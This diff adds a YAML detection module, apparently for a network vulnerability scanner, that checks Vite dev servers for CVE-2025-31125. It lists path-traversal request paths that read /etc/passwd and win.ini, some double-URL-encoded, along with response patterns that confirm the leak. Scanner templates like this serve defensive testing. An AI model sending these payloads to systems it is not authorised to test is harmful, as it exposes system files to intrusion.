@@ -1,0 +1,61 @@
+info:
+  name: vite_cve_2025_31125_vuln
+  author: Sankalp Bansal
+  severity: 7.5
+  description: >
+    Vite is a frontend tooling framework for JavaScript. Vite exposes
+    content of non-allowed files using ?inline&import or ?raw?import.
+    Only apps explicitly exposing the Vite dev server to the network
+    (using --host or server.host config option) are affected.
+
+  reference:
+    - https://nvd.nist.gov/vuln/detail/cve-2025-31125
+    - https://gbhackers.com/vite-development-server-flaw/
+
+  profiles:
+    - vuln
+    - http
+    - high_severity
+    - cve
+    - cve2025
+    - vite
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              path:
+                - "@fs/C:/windows/win.ini?import&?inline=1.wasm?init"
+                - "@fs/etc/passwd?import&?inline=1.wasm?init"
+                - "@fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init"
+                - "@fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            headers:
+              Content-Type:
+                regex: "text\/javascript|application\/javascript"
+                reverse: false
+            content:
+              regex: "data:application\/octet-stream|base64|import\\s+init"
+              reverse: false
